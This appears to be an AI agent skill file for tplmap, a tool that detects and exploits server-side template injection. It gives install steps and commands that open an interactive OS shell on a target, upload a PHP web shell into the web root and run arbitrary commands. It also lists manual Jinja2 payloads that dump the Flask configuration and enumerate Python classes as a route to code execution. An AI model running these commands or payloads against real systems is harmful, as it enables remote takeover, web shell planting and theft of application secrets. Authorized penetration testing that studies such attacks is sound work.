---
name: tplmap
description: "Automatic Server-Side Template Injection detection and exploitation across 18+ template engines. Use when testing for SSTI vulnerabilities in Jinja2, Twig, Smarty, Mako, and other template engines to achieve RCE."
license: MIT
compatibility: "Python 2/3; Linux/macOS; github.com/epinna/tplmap"
metadata:
  author: AeonDave
  version: "1.0"
---

# Tplmap

Automatic SSTI detection and exploitation — 18+ template engines.

## Quick Start

```bash
git clone https://github.com/epinna/tplmap
cd tplmap && pip install -r requirements.txt

# Detect SSTI
python2 tplmap.py -u "http://target.com/page?name=*"

# Shell via SSTI
python2 tplmap.py -u "http://target.com/page?name=*" --os-shell

# Upload file via SSTI
python2 tplmap.py -u "http://target.com/page?name=*" --upload /local/shell.php /var/www/html/shell.php
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL (mark injection with `*`) |
| `-d "k=v"` | POST data |
| `-H "K:V"` | Custom header |
| `--os-shell` | Interactive OS shell |
| `--os-cmd CMD` | Run single command |
| `--upload src dst` | Upload file |
| `--download src dst` | Download file |
| `--engine E` | Force specific engine |
| `--level N` | Detection level (1-5) |

## Supported Engines

Jinja2 · Twig · Smarty · Mako · Pebble · Jade · Tornado · Velocity · Freemarker · Cheetah · ERB · EJS · DustJS · Nunjucks · Marko

## Common Workflows

**Jinja2 manual verify:**
```
{{7*7}} → 49 in response = confirmed
{{config}} → dump Flask config
{{''.__class__.__mro__[1].__subclasses__()}} → list classes
```

**Automated RCE:**
```bash
python2 tplmap.py -u "http://target.com/render?tmpl=*" --os-shell
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Manual SSTI payloads per engine |
